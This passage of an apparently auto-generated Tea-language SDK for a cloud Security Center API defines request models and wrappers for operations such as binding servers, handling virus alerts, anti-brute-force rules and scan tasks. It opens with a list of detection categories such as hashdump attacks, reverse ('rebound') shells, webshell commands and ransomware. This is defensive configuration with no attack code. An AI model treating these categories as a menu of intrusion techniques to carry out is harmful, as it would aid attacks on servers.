*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound Shell (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: ransomware (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior (Windows)'),
}

model BatchOperateCommonOverallConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='765EDBDE-1686-5DBA-B76F-2E0E6E7E1B96'),
}

model BatchOperateCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: BatchOperateCommonOverallConfigResponseBody(name='body'),
}

async function batchOperateCommonOverallConfigWithOptions(request: BatchOperateCommonOverallConfigRequest, runtime: Util.RuntimeOptions): BatchOperateCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BatchOperateCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function batchOperateCommonOverallConfig(request: BatchOperateCommonOverallConfigRequest): BatchOperateCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return batchOperateCommonOverallConfigWithOptions(request, runtime);
}

model BindAuthToMachineRequest {
  authVersion?: int32(name='AuthVersion', description='The edition of Security Center. Valid values:

*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='6'),
  autoBind?: int32(name='AutoBind', description='Specifies whether to automatically bind servers to Security Center. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  bind?: [ string ](name='Bind', description='The UUIDs of the servers that you want to bind to Security Center.

>  You must specify at least one of the **Bind** and **UnBind** parameters.'),
  bindAll?: boolean(name='BindAll', description='Specifies whether to bind all servers to Security Center. Default value: **false**. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  criteria?: string(name='Criteria', description='The search conditions that are used to filter servers. The value of this parameter is in the JSON format and is case-sensitive.

>  A search condition can be an instance ID, instance name, virtual private cloud (VPC) ID, region, or public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='[{"name":"riskStatus","value":"YES"},{"name":"internetIp","value":"1.2.XX.XX"}]'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship among multiple search conditions. Valid values:

*   **OR**: Search conditions are evaluated by using a logical **OR**.
*   **AND**: Search conditions are evaluated by using a logical **AND**.', example='OR'),
  unBind?: [ string ](name='UnBind', description='The UUIDs of the servers that you want to unbind from Security Center.

>  You must specify at least one of the **Bind** and **UnBind** parameters.'),
}

model BindAuthToMachineResponseBody = {
  bindCount?: int32(name='BindCount', description='The number of bound servers.', example='1'),
  insufficientCoreCount?: int32(name='InsufficientCoreCount', description='The shortage in the quota for cores of servers that can be protected.', example='1'),
  insufficientEcsCount?: int32(name='InsufficientEcsCount', description='The shortage in the quota for servers that can be protected.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='23AD0BD2-8771-5647-819E-6BA51E212F80'),
  resultCode?: int32(name='ResultCode', description='The status code that indicates the result. Valid values:

*   **0**: The servers are bound to or unbound from Security Center.
*   **1**: The values that you specified for the parameters are invalid.
*   **2**: The quota for servers that can be protected is insufficient.
*   **3**: The quota for cores of servers that can be protected is insufficient.', example='2'),
  unBindCount?: int32(name='UnBindCount', description='The number of unbound servers.', example='1'),
}

model BindAuthToMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: BindAuthToMachineResponseBody(name='body'),
}

async function bindAuthToMachineWithOptions(request: BindAuthToMachineRequest, runtime: Util.RuntimeOptions): BindAuthToMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.authVersion)) {
    query['AuthVersion'] = request.authVersion;
  }
  if (!Util.isUnset(request.autoBind)) {
    query['AutoBind'] = request.autoBind;
  }
  if (!Util.isUnset(request.bind)) {
    query['Bind'] = request.bind;
  }
  if (!Util.isUnset(request.bindAll)) {
    query['BindAll'] = request.bindAll;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.unBind)) {
    query['UnBind'] = request.unBind;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BindAuthToMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function bindAuthToMachine(request: BindAuthToMachineRequest): BindAuthToMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return bindAuthToMachineWithOptions(request, runtime);
}

model CancelOnceTaskRequest {
  taskId?: string(name='TaskId', description='The ID of the task.

>  You can call the [GenerateOnceTask](~~GenerateOnceTask~~) operation to query the IDs of tasks.', example='ec9c0d88f36cc27765a98c554ee2****'),
}

model CancelOnceTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
}

model CancelOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CancelOnceTaskResponseBody(name='body'),
}

async function cancelOnceTaskWithOptions(request: CancelOnceTaskRequest, runtime: Util.RuntimeOptions): CancelOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CancelOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function cancelOnceTask(request: CancelOnceTaskRequest): CancelOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return cancelOnceTaskWithOptions(request, runtime);
}

model ChangeCheckConfigRequest {
  endTime?: int32(name='EndTime', example='6'),
  regionId?: string(name='RegionId'),
  standardIds?: [ long ](name='StandardIds'),
  startTime?: int32(name='StartTime', example='0'),
}

model ChangeCheckConfigResponseBody = {
  requestId?: string(name='RequestId', example='6EBB8614-746D-555D-AB69-C801AEC7DCE0'),
}

model ChangeCheckConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ChangeCheckConfigResponseBody(name='body'),
}

async function changeCheckConfigWithOptions(request: ChangeCheckConfigRequest, runtime: Util.RuntimeOptions): ChangeCheckConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.standardIds)) {
    query['StandardIds'] = request.standardIds;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ChangeCheckConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function changeCheckConfig(request: ChangeCheckConfigRequest): ChangeCheckConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return changeCheckConfigWithOptions(request, runtime);
}

model CheckQuaraFileIdRequest {
  quaraFileIds?: [ string ](name='QuaraFileIds', description='The IDs of quarantined files that you want to check.

>  You can call the [DescribeSuspEventQuaraFiles](~~DescribeSuspEventQuaraFiles~~) operation to query the IDs of quarantined files.'),
  uuid?: string(name='Uuid', description='The UUID of the server on which you want to check quarantined files.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model CheckQuaraFileIdResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the ID of the quarantined file is valid. Valid values:

*   **true**: The ID of the quarantined file is valid.
*   **false**: The ID of the quarantined file is invalid.', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model CheckQuaraFileIdResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckQuaraFileIdResponseBody(name='body'),
}

async function checkQuaraFileIdWithOptions(request: CheckQuaraFileIdRequest, runtime: Util.RuntimeOptions): CheckQuaraFileIdResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.quaraFileIds)) {
    query['QuaraFileIds'] = request.quaraFileIds;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckQuaraFileId',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function checkQuaraFileId(request: CheckQuaraFileIdRequest): CheckQuaraFileIdResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkQuaraFileIdWithOptions(request, runtime);
}

model CheckSecurityEventIdRequest {
  securityEventIds?: [ string ](name='SecurityEventIds', description='The IDs of alert events. You can specify up to 100 IDs. If you do not specify this parameter, the value of the response parameter **Data** is **false**. The value false indicates that no alert events are generated on the server.

>  You can call the [DescribeAlarmEventList](~~DescribeAlarmEventList~~) operation to query the IDs of alert events.', example='["1234567","98765432"]'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='96ad2473-bc60-45ba-ad1c-932e2866****'),
}

model CheckSecurityEventIdResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the alert events are generated on the server. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1383B0DB-D5D6-4B0C-9E6B-75939C8E67FE'),
}

model CheckSecurityEventIdResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckSecurityEventIdResponseBody(name='body'),
}

async function checkSecurityEventIdWithOptions(request: CheckSecurityEventIdRequest, runtime: Util.RuntimeOptions): CheckSecurityEventIdResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckSecurityEventId',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function checkSecurityEventId(request: CheckSecurityEventIdRequest): CheckSecurityEventIdResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkSecurityEventIdWithOptions(request, runtime);
}

model CheckUserHasEcsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model CheckUserHasEcsResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request is successful. Other status codes indicate that the request fails. You can identify the cause of the failure based on the status code.', example='200'),
  data?: boolean(name='Data', description='Indicates whether ECS instances exist. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  success?: boolean(name='Success', description='The status of the request. Valid values:

*   **true**: The request is successful.
*   **false**: The request fails.', example='true'),
}

model CheckUserHasEcsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckUserHasEcsResponseBody(name='body'),
}

async function checkUserHasEcsWithOptions(request: CheckUserHasEcsRequest, runtime: Util.RuntimeOptions): CheckUserHasEcsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckUserHasEcs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function checkUserHasEcs(request: CheckUserHasEcsRequest): CheckUserHasEcsResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkUserHasEcsWithOptions(request, runtime);
}

model ConfirmVirusEventsRequest {
  operationAll?: int32(name='OperationAll', description='Specifies whether to handle all alert events. Valid values:

*   **1**: yes
*   **0**: no', example='0'),
  operationCode?: string(name='OperationCode', description='The operation that you want to perform on the alert events. Valid values:

*   **default**: performs in-depth detection and removal
*   **ignore**: ignores the alert event
*   **advance\\_mark\\_mis_info**: adds the alert events to the whitelist
*   **manual_handled**: marks the alert events as manually handled', example='default'),
  operationRange?: string(name='OperationRange', description='The server on which you want to perform the alert events.', example='[{\\"type\\":\\"machine\\",\\"list\\":[\\"3aedba3d-bd4d-4dfb-bb0d-xxxxxxxxxxxx\\"]}]'),
}

model ConfirmVirusEventsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='5DFD6277-CC36-57F7-ACE6-F5952XXXXXXXX'),
  result?: boolean(name='Result', description='Indicates whether the request was successful. Valid values:

*   true: The request was successful.
*   false: The request failed.', example='true'),
}

model ConfirmVirusEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ConfirmVirusEventsResponseBody(name='body'),
}

async function confirmVirusEventsWithOptions(request: ConfirmVirusEventsRequest, runtime: Util.RuntimeOptions): ConfirmVirusEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operationAll)) {
    query['OperationAll'] = request.operationAll;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationRange)) {
    query['OperationRange'] = request.operationRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ConfirmVirusEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function confirmVirusEvents(request: ConfirmVirusEventsRequest): ConfirmVirusEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return confirmVirusEventsWithOptions(request, runtime);
}

model CreateAntiBruteForceRuleRequest {
  defaultRule?: boolean(name='DefaultRule', description='Specifies whether to set the defense rule as the default rule. Valid values:

*   **true**: yes
*   **false**: no

>  If no defense rule is created for a server, the default rule is applied to the server.', example='true'),
  failCount?: int32(name='FailCount', description='The maximum number of failed logon attempts from an account. Valid values: 2, 3, 4, 5, 10, 50, 80, and 100.', example='2'),
  forbiddenTime?: int32(name='ForbiddenTime', description='The period of time during which logons from an account are not allowed. Unit: minutes. Valid values:

*   **5**: 5 minutes
*   **15**: 15 minutes
*   **30**: 30 minutes
*   **60**: 1 hour
*   **120**: 2 hours
*   **360**: 6 hours
*   **720**: 12 hours
*   **1440**: 24 hours
*   **10080**: 7 days
*   **52560000**: permanent', example='5'),
  name?: string(name='Name', description='The name of the defense rule.', example='TestAntiBruteForceRule'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  span?: int32(name='Span', description='The maximum period of time during which failed logon attempts from an account can occur. Unit: minutes. Valid values:

*   **1**
*   **2**
*   **5**
*   **10**
*   **15**

>  To configure a defense rule, you must specify the Span, FailCount, and ForbiddenTime parameters. If the number of failed logon attempts from an account within the minutes specified by Span exceeds the value specified by FailCount, the account cannot be used for logons within the minutes specified by ForbiddenTime.', example='1'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers to which you want to apply the defense rule.'),
}

model CreateAntiBruteForceRuleResponseBody = {
  createAntiBruteForceRule?: {
    ruleId?: long(name='RuleId', description='The ID of the defense rule.', example='65778'),
  }(name='CreateAntiBruteForceRule', description='The information about the defense rule.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model CreateAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateAntiBruteForceRuleResponseBody(name='body'),
}

async function createAntiBruteForceRuleWithOptions(request: CreateAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): CreateAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defaultRule)) {
    query['DefaultRule'] = request.defaultRule;
  }
  if (!Util.isUnset(request.failCount)) {
    query['FailCount'] = request.failCount;
  }
  if (!Util.isUnset(request.forbiddenTime)) {
    query['ForbiddenTime'] = request.forbiddenTime;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.span)) {
    query['Span'] = request.span;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createAntiBruteForceRule(request: CreateAntiBruteForceRuleRequest): CreateAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createAntiBruteForceRuleWithOptions(request, runtime);
}

model CreateBackupPolicyRequest {
  name?: string(name='Name'),
  policy?: map[string]any(name='Policy'),
  policyRegionId?: string(name='PolicyRegionId'),
  policyVersion?: string(name='PolicyVersion'),
  uuidList?: [ string ](name='UuidList'),
}

model CreateBackupPolicyShrinkRequest {
  name?: string(name='Name'),
  policyShrink?: string(name='Policy'),
  policyRegionId?: string(name='PolicyRegionId'),
  policyVersion?: string(name='PolicyVersion'),
  uuidList?: [ string ](name='UuidList'),
}

model CreateBackupPolicyResponseBody = {
  backupPolicy?: {
    id?: string(name='Id'),
    status?: string(name='Status'),
  }(name='BackupPolicy'),
  requestId?: string(name='RequestId'),
}

model CreateBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateBackupPolicyResponseBody(name='body'),
}

async function createBackupPolicyWithOptions(tmpReq: CreateBackupPolicyRequest, runtime: Util.RuntimeOptions): CreateBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new CreateBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.policy)) {
    request.policyShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.policy, 'Policy', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.policyShrink)) {
    query['Policy'] = request.policyShrink;
  }
  if (!Util.isUnset(request.policyRegionId)) {
    query['PolicyRegionId'] = request.policyRegionId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createBackupPolicy(request: CreateBackupPolicyRequest): CreateBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return createBackupPolicyWithOptions(request, runtime);
}

model CreateContainerScanTaskRequest {
  clusterId?: string(name='ClusterId', example='c22143730ab6e40b09ec7c1c51d4d****'),
  containerIds?: string(name='ContainerIds', example='c927cf190e886696db53cda0efb57145394ccf0bf9f525353fa5c22a26e4****'),
  lang?: string(name='Lang', example='zh'),
}

model CreateContainerScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', example='true'),
    collectTime?: long(name='CollectTime', example='1644286364150'),
    execTime?: long(name='ExecTime', example='1644286364150'),
    finishCount?: int32(name='FinishCount', example='33'),
    progress?: int32(name='Progress', example='100'),
    result?: string(name='Result', example='SUCCESS'),
    status?: string(name='Status', example='SUCCESS'),
    taskId?: string(name='TaskId', example='fc98d58eb56f699d49bf7ebbd6d7****'),
    totalCount?: int32(name='TotalCount', example='62'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='9F4E6157-9600-5588-86B9-38F09067****'),
}

model CreateContainerScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateContainerScanTaskResponseBody(name='body'),
}

async function createContainerScanTaskWithOptions(request: CreateContainerScanTaskRequest, runtime: Util.RuntimeOptions): CreateContainerScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerIds)) {
    query['ContainerIds'] = request.containerIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateContainerScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createContainerScanTask(request: CreateContainerScanTaskRequest): CreateContainerScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createContainerScanTaskWithOptions(request, runtime);
}

model CreateCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', example='192.168.xx.xx'),
  bound?: string(name='Bound', example='in'),
  expireTime?: long(name='ExpireTime', example='1859094550000'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuids?: string(name='Uuids', example='71c846d6-5c84-4714-acfc-58265bc3****,5013b5e8-1613-43a8-b4de-651db318****,df53f0ad-b3ba-4fe0-9ec7-f42a2ae2****'),
}

model CreateCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', example='30CBF632-109F-596F-97F2-451C8B2A****'),
}

model CreateCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateCustomBlockRecordResponseBody(name='body'),
}

async function createCustomBlockRecordWithOptions(request: CreateCustomBlockRecordRequest, runtime: Util.RuntimeOptions): CreateCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.expireTime)) {
    query['ExpireTime'] = request.expireTime;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createCustomBlockRecord(request: CreateCustomBlockRecordRequest): CreateCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return createCustomBlockRecordWithOptions(request, runtime);
}

model CreateCycleTaskRequest {
  enable?: int32(name='Enable', description='Specifies whether to enable the task. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
  firstDateStr?: long(name='FirstDateStr', description='The first time when the task is performed.', example='1650556800000'),
  intervalPeriod?: int32(name='IntervalPeriod', description='The interval of the task.', example='7'),
  param?: string(name='Param', description='The additional information.', example='{
      "targetInfo": [
            {
                  "type": "groupId",
                  "name": "TI HOST",
                  "target": 10597***
            },
            {
                  "type": "groupId",
                  "name": "expense HOST",
                  "target": 10597***
            }
      ]
}'),
  periodUnit?: string(name='PeriodUnit', description='The unit of the scan interval. Valid values:

*   **day**: days
*   **hour**: hours', example='day'),
  source?: string(name='Source', description='The additional source for the task.', example='console_batch'),
  targetEndTime?: int32(name='TargetEndTime', description='The time when the task ends. Unit: hours.', example='6'),
  targetStartTime?: int32(name='TargetStartTime', description='The time when the task is started. Unit: hours.', example='0'),
  taskName?: string(name='TaskName', description='The name of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task', example='EMG_VUL_SCHEDULE_SCAN'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus scan task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task', example='VIRUS_VUL_SCHEDULE_SCAN'),
}

model CreateCycleTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='86CFF42E-E00A-57A3-8656-22291EFB****'),
}

model CreateCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateCycleTaskResponseBody(name='body'),
}

async function createCycleTaskWithOptions(request: CreateCycleTaskRequest, runtime: Util.RuntimeOptions): CreateCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.enable)) {
    query['Enable'] = request.enable;
  }
  if (!Util.isUnset(request.firstDateStr)) {
    query['FirstDateStr'] = request.firstDateStr;
  }
  if (!Util.isUnset(request.intervalPeriod)) {
    query['IntervalPeriod'] = request.intervalPeriod;
  }
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.periodUnit)) {
    query['PeriodUnit'] = request.periodUnit;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.targetEndTime)) {
    query['TargetEndTime'] = request.targetEndTime;
  }
  if (!Util.isUnset(request.targetStartTime)) {
    query['TargetStartTime'] = request.targetStartTime;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

